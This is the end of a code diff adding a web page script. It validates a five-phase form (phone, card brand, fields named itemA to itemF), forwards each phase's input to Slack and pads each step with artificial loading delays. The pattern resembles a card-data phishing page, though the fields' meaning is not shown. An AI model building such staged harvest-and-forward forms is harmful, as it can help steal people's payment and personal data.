+            !/^[0-9\-]{10,15}$/.test(data.phone.replace(/[\s\-]/g, ""))
+          ) {
+            showError("phone");
+            valid = false;
+          }
+        } else if (phase === 2) {
+          if (!data.cardBrand) {
+            showError("brand");
+            valid = false;
+          }
+        } else if (phase === 3) {
+          if (!data.itemA) {
+            showError("itemA");
+            valid = false;
+          }
+          if (!data.itemB) {
+            showError("itemB");
+            valid = false;
+          }
+          if (!data.itemC) {
+            showError("itemC");
+            valid = false;
+          }
+          if (!data.itemD) {
+            showError("itemD");
+            valid = false;
+          }
+          if (!data.itemE) {
+            showError("itemE");
+            valid = false;
+          }
+        } else if (phase === 4) {
+          if (!data.itemF) {
+            showError("itemF");
+            valid = false;
+          }
+        } else if (phase === 5) {
+          // 項目Gは任意入力のためバリデーション不要
+        }
+
+        if (!valid) return;
+
+        // Send to Slack with minimum loading time for UX
+        const btnId = "btn-phase" + phase;
+        setButtonLoading(btnId, true);
+
+        const delayMs = phase >= 5 ? 5400 : phase >= 3 ? 3600 : 1800;
+        const minDelay = new Promise((resolve) => setTimeout(resolve, delayMs));
+        const slackPromise = sendSlackNotification(phase, data);
+        await Promise.all([minDelay, slackPromise]);
+
+        setButtonLoading(btnId, false);
+
+        // Lock current phase and unlock next
+        lockInputs(phase);
+        updateProgress(phase);
+
+        if (phase < 5) {
+          unlockPhase(phase + 1);
+        } else {
+          // Final phase completed
+          document.getElementById("phase-5").style.display = "none";
+          const finalMsg = document.getElementById("final-message");
+          finalMsg.classList.add("show");
+          finalMsg.scrollIntoView({ behavior: "smooth", block: "center" });
+        }
+      }
+    </script>
+  </body>
+</html>
